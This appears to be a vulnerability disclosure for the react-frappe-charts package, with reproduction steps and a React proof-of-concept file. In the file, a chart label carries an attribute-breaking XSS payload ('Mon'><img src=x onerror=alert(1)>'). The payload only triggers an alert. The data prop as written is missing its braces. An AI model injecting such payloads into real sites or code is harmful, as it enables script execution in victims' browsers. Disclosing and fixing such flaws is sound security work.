# Description

`react-frappe-charts` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

1. Create a sandbox using "React" https://codesandbox.io/s
2. Edit the data in the file `App.js` with the following code
```
//App.js
import React, { useRef } from "react";
import ReactFrappeChart from "react-frappe-charts";

export default function MyChart(props) {
  const chartRef = useRef();

  const exportChart = () => {
    if (chartRef && chartRef.current) {
      chartRef.current.export();
    }
  };

  return (
    <div>
      <ReactFrappeChart
        ref={chartRef}
        type="bar"
        colors={["#21ba45"]}
        axisOptions={{ xAxisMode: "tick", yAxisMode: "tick", xIsSeries: 1 }}
        height={250}
        data=
          labels: ["Sun", "Mon'><img src=x onerror=alert(1)>", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
          datasets: [{ values: [18, 60, 30, 35, 8, 52, 17, 4] }],
      />
      <button onClick={exportChart} type="button">
        Export
      </button>
    </div>
  );
}
```
3. And add the appropriate dependencies
4. XSS payload will get executed.
